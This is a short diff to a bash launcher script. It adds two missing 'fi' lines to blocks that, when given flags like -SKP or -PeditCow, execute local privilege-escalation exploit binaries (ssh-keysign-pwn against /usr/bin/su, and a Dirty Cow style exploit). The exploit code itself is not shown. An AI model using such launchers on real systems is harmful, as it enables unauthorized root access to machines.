@@ -156,6 +156,7 @@ if [[ "$*" == "-SKP" ]]; then
      echo "[+] PATH=${PWD}/exploit/ssh-keysign-pwn/skp"
      echo "[+] Executing the binary..."
      ${PWD}/exploit/ssh-keysign-pwn/skp /usr/bin/su
+fi
 
 # PeditCow
 if [[ "$*" == "-PeditCow" ]]; then
@@ -164,3 +165,4 @@ if [[ "$*" == "-PeditCow" ]]; then
      echo "[+] PATH=${PWD}/exploit/PeditCow/peditcow"
      echo "[+] Executing the binary..."
      ${PWD}/exploit/PeditCow/peditcow
+fi
